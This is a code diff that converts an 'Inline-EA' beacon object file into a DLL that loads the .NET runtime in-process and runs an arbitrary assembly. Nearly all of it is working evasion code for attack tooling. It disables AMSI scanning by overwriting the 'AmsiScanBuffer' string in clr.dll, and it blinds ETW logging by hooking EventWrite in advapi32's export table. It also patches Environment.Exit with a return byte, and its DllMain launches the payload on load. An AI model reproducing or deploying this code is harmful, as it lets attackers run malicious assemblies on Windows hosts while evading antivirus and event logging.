@@ -4,16 +4,18 @@
  * - Ported from @EricEsquivel's Inline-EA BOF
  * 
  */
+#include <basetsd.h>
+#include <minwindef.h>
 #include <windows.h>
 #include <stdio.h>
 #include <unknwnbase.h>
 #include <psapi.h>
 #include <string.h>
+#include <winnt.h>
 #include "mscorlib.h"
 #include "metahost.h"
 #include "inline-ea.h"
 #include "fcntl.h"
-#include "tcg.h"
 
 BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, BOOL patchExitflag, BOOL patchAmsiflag);
 BOOL FindVersion(void* assembly, int length);
@@ -22,50 +24,6 @@ DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA);
 BOOL DummyFunction(void);
 BOOL patchExit(ICorRuntimeHost* runtimeHost);
 
-
-/**
- * @brief Entrypoint of PICO
- */
-HRESULT go(
-    PCHAR       assemblyBytes, 
-    SIZE_T      assemblyByteLen, 
-    LPCWSTR*    assemblyArguments, 
-    BOOL        patchExitflag,
-    BOOL        patchAmsiflag,
-    BOOL        patchEtwflag 
-)
-{
-    patchExitflag = TRUE;
-    patchAmsiflag = TRUE;
-    patchEtwflag  = TRUE;
-
-    /* Bypass ETW with EAT Hooking */
-    if (patchEtwflag != FALSE) {
-
-        // HMODULE advapi = KERNEL32$LoadLibraryA("advapi32.dll");
-        HMODULE advapi = LoadLibraryA("advapi32.dll");
-        if (advapi == NULL) {
-            return -1;
-        }
-
-        // PVOID originalFunc = KERNEL32$GetProcAddress(advapi, "EventWrite");
-        PVOID originalFunc = GetProcAddress(advapi, "EventWrite");
-        if (originalFunc == NULL) {
-            return -1;
-        }
-
-        if (!EATHook(advapi, (CHAR *)"EventWrite", (PVOID)&DummyFunction, (PVOID *)&originalFunc))
-        {
-            return -1;
-        }
-        // dprintf("[TCG] Hooked EAT!");
-    }
-
-    /* Execute inline dotnet */
-    Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, patchExitflag, patchAmsiflag);
-
-    return 0;
-}
 
 /**
  * @brief Load CLR into process and call .NET assembly entrypoint with args
@@ -90,7 +48,7 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 
     /* -------- CLR init -------- */
 
-    HResult = MSCOREE$CLRCreateInstance(
+    HResult = CLRCreateInstance(
         &xCLSID_CLRMetaHost,
         &xIID_ICLRMetaHost,
         (PVOID*)&metaHost
@@ -119,13 +77,12 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
 
     /* Load clr.dll with shim */
     HMODULE clrMod = NULL;
-    MSCOREE$LoadLibraryShim(L"clr.dll", wVersion, NULL, &clrMod);
+    LoadLibraryShim(L"clr.dll", wVersion, NULL, &clrMod);
 
     if (patchAmsiflag) {
         if (!PatchAmsiScanBuffer(clrMod))
             goto cleanup;
     }
-    // dprintf("[TCG] Patched AMSI!");
 
     HResult = runtimeInfo->lpVtbl->GetInterface(
         runtimeInfo,
@@ -163,11 +120,11 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
     sab.lLbound  = 0;
     sab.cElements = AssemblySize;
 
-    SafeAssembly = OLEAUT32$SafeArrayCreate(VT_UI1, 1, &sab);
+    SafeAssembly = SafeArrayCreate(VT_UI1, 1, &sab);
     if (!SafeAssembly)
         goto cleanup;
 
-    MSVCRT$memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);
+    memcpy(SafeAssembly->pvData, AssemblyBytes, AssemblySize);
 
     HResult = AppDomain->lpVtbl->Load_3(
         AppDomain,
@@ -181,7 +138,6 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
         if (!patchExit(runtimeHost))
             goto cleanup;
     }
-    // dprintf("[TCG] Patched ExitFlag!");
 
     HResult = Assembly->lpVtbl->get_EntryPoint(Assembly, &MethodInfo);
     if (FAILED(HResult) || !MethodInfo)
@@ -196,40 +152,40 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
         ULONG argc = 0;
         PWSTR* argv = NULL;
 
-        SafeArguments = OLEAUT32$SafeArrayCreateVector(VT_VARIANT, 0, 1);
+        SafeArguments = SafeArrayCreateVector(VT_VARIANT, 0, 1);
         if (!SafeArguments)
             goto cleanup;
 
-        if (wAssemblyArguments && MSVCRT$wcslen(wAssemblyArguments)) {
-            argv = SHELL32$CommandLineToArgvW(
+        if (wAssemblyArguments && wcslen(wAssemblyArguments)) {
+            argv = CommandLineToArgvW(
                 wAssemblyArguments,
                 (PINT)&argc
             );
         }
 
         VARIANT var;
-        OLEAUT32$VariantInit(&var);
+        VariantInit(&var);
 
         var.vt = VT_ARRAY | VT_BSTR;
-        var.parray = OLEAUT32$SafeArrayCreateVector(VT_BSTR, 0, argc);
+        var.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);
 
         for (LONG i = 0; i < (LONG)argc; i++) {
-            BSTR b = OLEAUT32$SysAllocString(argv[i]);
-            OLEAUT32$SafeArrayPutElement(var.parray, &i, b);
+            BSTR b = SysAllocString(argv[i]);
+            SafeArrayPutElement(var.parray, &i, b);
         }
 
         LONG idx = 0;
-        OLEAUT32$SafeArrayPutElement(SafeArguments, &idx, &var);
-        OLEAUT32$SafeArrayDestroy(var.parray);
+        SafeArrayPutElement(SafeArguments, &idx, &var);
+        SafeArrayDestroy(var.parray);
 
         if (argv)
-            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, argv);
+            HeapFree(GetProcessHeap(), 0, argv);
     }
 
 
     /* Run the stuff */
     VARIANT empty;
-    OLEAUT32$VariantInit(&empty);
+    VariantInit(&empty);
 
     MethodInfo->lpVtbl->Invoke_3(
         MethodInfo,
@@ -248,8 +204,8 @@ cleanup:
     if (runtimeInfo) runtimeInfo->lpVtbl->Release(runtimeInfo);
     if (metaHost)    metaHost->lpVtbl->Release(metaHost);
 
-    if (SafeAssembly)  OLEAUT32$SafeArrayDestroy(SafeAssembly);
-    if (SafeArguments) OLEAUT32$SafeArrayDestroy(SafeArguments);
+    if (SafeAssembly)  SafeArrayDestroy(SafeAssembly);
+    if (SafeArguments) SafeArrayDestroy(SafeArguments);
 
     return TRUE;
 }
@@ -292,8 +248,7 @@ BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security An
     typedef BOOL (WINAPI *fnGetModuleInformation)(HANDLE, HMODULE, LPMODULEINFO, DWORD);
 
 	
-    fnGetModuleInformation pGetModuleInformation = (fnGetModuleInformation)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("psapi.dll"), "GetModuleInformation");
-	// fnGetModuleInformation pGetModuleInformation = PSAPI$GetModuleInformation;
+    fnGetModuleInformation pGetModuleInformation = (fnGetModuleInformation)GetProcAddress(LoadLibraryA("psapi.dll"), "GetModuleInformation");
     if (!pGetModuleInformation)
         return FALSE;
 
@@ -304,7 +259,7 @@ BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security An
     }
 
     const CHAR targetString[] = "AmsiScanBuffer";
-    int strLength = MSVCRT$strlen(targetString);
+    int strLength = strlen(targetString);
 
     PBYTE pModule = (PBYTE)hModule;
     PVOID foundAddress = NULL;
@@ -312,7 +267,7 @@ BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security An
     SIZE_T i;
     for (i = 0; i <= modInfo.SizeOfImage - strLength; i++)
     {
-        if (MSVCRT$memcmp(pModule + i, targetString, strLength) == 0)
+        if (memcmp(pModule + i, targetString, strLength) == 0)
         {
             foundAddress = pModule + i;
             break;
@@ -323,14 +278,14 @@ BOOL PatchAmsiScanBuffer(HMODULE moduleHandle) // Credits: Practical Security An
         return TRUE; /* Already patched */
 
     DWORD oldProt;
-    if (!KERNEL32$VirtualProtect(foundAddress, strLength, PAGE_READWRITE, &oldProt))
+    if (!VirtualProtect(foundAddress, strLength, PAGE_READWRITE, &oldProt))
     {
         return FALSE;
     }
 
-    MSVCRT$memset(foundAddress, 0, strLength);
+    memset(foundAddress, 0, strLength);
 
-    KERNEL32$VirtualProtect(foundAddress, strLength, oldProt, &oldProt);
+    VirtualProtect(foundAddress, strLength, oldProt, &oldProt);
 
     return TRUE;
 }
@@ -368,13 +323,13 @@ DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA) // Credits: Jimster480
 		DWORD* nameRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames + (i * sizeof(DWORD)));
 		char* currName = (char*)((BYTE*)mod + (*nameRVA));
 
-		if (MSVCRT$strcmp(currName, FN) == 0)
+		if (strcmp(currName, FN) == 0)
 		{
 			WORD* ordinal = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals + (i * sizeof(WORD)));
 			DWORD* funcRVA = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions + ((*ordinal) * sizeof(DWORD)));
 
 			DWORD oldProtect;
-			if (!KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
+			if (!VirtualProtect(funcRVA, sizeof(DWORD), PAGE_READWRITE, &oldProtect))
 				return 0;
 
 			*OA = (VOID*)((BYTE*)mod + (*funcRVA));
@@ -382,7 +337,7 @@ DWORD EATHook(HMODULE mod, char* FN, VOID* HA, VOID** OA) // Credits: Jimster480
 			*funcRVA = (DWORD)((UINT_PTR)HA - (UINT_PTR)mod);
 
 			DWORD dummy;
-			KERNEL32$VirtualProtect(funcRVA, sizeof(DWORD), oldProtect, &dummy);
+			VirtualProtect(funcRVA, sizeof(DWORD), oldProtect, &dummy);
 
 			return 1;
 		}
@@ -401,59 +356,136 @@ BOOL patchExit(ICorRuntimeHost* runtimeHost) // Credits: Kyle Avery "Unmanaged .
 	appDomainUnk->lpVtbl->QueryInterface(appDomainUnk, &xIID_AppDomain, (VOID**)&appDomain);
 
 	_Assembly* mscorlib = NULL;
-	appDomain->lpVtbl->Load_2(appDomain, OLEAUT32$SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);
+	appDomain->lpVtbl->Load_2(appDomain, SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);
 
 
 
 	_Type* exitClass = NULL;
-	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.Environment"), &exitClass);
+	mscorlib->lpVtbl->GetType_2(mscorlib, SysAllocString(L"System.Environment"), &exitClass);
 
 	_MethodInfo* exitInfo = NULL;
 	BindingFlags exitFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Static);
-	exitClass->lpVtbl->GetMethod_2(exitClass, OLEAUT32$SysAllocString(L"Exit"), exitFlags, &exitInfo);
+	exitClass->lpVtbl->GetMethod_2(exitClass, SysAllocString(L"Exit"), exitFlags, &exitInfo);
 
 
 
 
 	_Type* methodInfoClass = NULL;
-	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);
+	mscorlib->lpVtbl->GetType_2(mscorlib, SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);
 
 	_PropertyInfo* methodHandleProp = NULL;
 	BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
-	methodInfoClass->lpVtbl->GetProperty(methodInfoClass, OLEAUT32$SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProp);
+	methodInfoClass->lpVtbl->GetProperty(methodInfoClass, SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProp);
 
 	VARIANT methodHandlePtr;
-	OLEAUT32$VariantInit(&methodHandlePtr);
+	VariantInit(&methodHandlePtr);
 	methodHandlePtr.vt = VT_UNKNOWN;
 	methodHandlePtr.punkVal = (IUnknown*)exitInfo;
 
-	SAFEARRAY* methodHandleArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
+	SAFEARRAY* methodHandleArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
 	VARIANT methodHandleVal;
-	OLEAUT32$VariantInit(&methodHandleVal);
+	VariantInit(&methodHandleVal);
 	methodHandleProp->lpVtbl->GetValue(methodHandleProp, methodHandlePtr, methodHandleArgs, &methodHandleVal);
 
 
 
 
 	_Type* rtMethodHandleType = NULL;
-	mscorlib->lpVtbl->GetType_2(mscorlib, OLEAUT32$SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);
+	mscorlib->lpVtbl->GetType_2(mscorlib, SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);
 
 	_MethodInfo* getFuncPtrMethodInfo = NULL;
 	BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
-	rtMethodHandleType->lpVtbl->GetMethod_2(rtMethodHandleType, OLEAUT32$SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);
+	rtMethodHandleType->lpVtbl->GetMethod_2(rtMethodHandleType, SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);
 
-	SAFEARRAY* getFuncPtrArgs = OLEAUT32$SafeArrayCreateVector(VT_EMPTY, 0, 0);
+	SAFEARRAY* getFuncPtrArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
 	VARIANT exitPtr;
-	OLEAUT32$VariantInit(&exitPtr);
+	VariantInit(&exitPtr);
 	getFuncPtrMethodInfo->lpVtbl->Invoke_3(getFuncPtrMethodInfo, methodHandleVal, getFuncPtrArgs, &exitPtr);
 
 
 
 	DWORD oldProt = 0;
 	BYTE patch = 0xC3;
-	KERNEL32$VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
-	MSVCRT$memcpy(exitPtr.byref, &patch, 1);
-	KERNEL32$VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt);
+	VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
+	memcpy(exitPtr.byref, &patch, 1);
+	VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt);
 
 	return TRUE;
+}
+
+/**
+ * @brief Execute the .NET Assembly with arguments
+ */
+HRESULT ExecuteAssembly(LPVOID lpArguments)
+{
+    /* Arguments passed to the Execute Assembly DLL 
+     *
+     * Total Length: Total length of the arguments
+     * File Length:  Length of the file
+     * File:         Pointer to the file
+     * Arg Length:   Length of the arguments
+     * Args:         Pointer to the arguments
+    */
+    PBYTE  Buffer      = (PBYTE)lpArguments;
+    UINT32 TotalLength = *(UINT32*)Buffer;
+    UINT32 FileLength  = *(UINT32*)(Buffer + sizeof(UINT32));
+    PBYTE  File        = Buffer + sizeof(UINT_PTR);
+    UINT32 ArgLength   = *(UINT32*)(Buffer + sizeof(UINT32) + sizeof(UINT32) + FileLength);
+    LPWSTR Args        = (LPWSTR)(Buffer + sizeof(UINT32) + sizeof(UINT32) + FileLength + sizeof(UINT32));
+
+    /* TODO: Pass from tasking */
+    BOOL patchExitflag = TRUE;
+    BOOL patchAmsiflag = TRUE;
+    BOOL patchEtwflag  = TRUE;
+
+
+    /* Bypass ETW with EAT Hooking */
+    if (patchEtwflag != FALSE) {
+
+        HMODULE advapi = LoadLibraryA("advapi32.dll");
+        if (advapi == NULL) {
+            return -1;
+        }
+
+        PVOID originalFunc = GetProcAddress(advapi, "EventWrite");
+        if (originalFunc == NULL) {
+            return -1;
+        }
+
+        if (!EATHook(advapi, (CHAR *)"EventWrite", (PVOID)&DummyFunction, (PVOID *)&originalFunc))
+        {
+            return -1;
+        }
+    }
+
+    /* Execute inline dotnet */
+    Executedotnet(File, FileLength, Args, patchExitflag, patchAmsiflag);
+
+    return 0;
+}
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    HANDLE hThread = NULL;
+
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        DisableThreadLibraryCalls(hModule);
+        
+        /* Run ExecuteAssembly in new thread */
+        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExecuteAssembly, lpReserved, 0, NULL);
+        if (hThread != NULL)
+        {
+            WaitForSingleObject(hThread, INFINITE);
+            CloseHandle(hThread);
+        }
+        
+        break;
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+
+    return TRUE;
 }
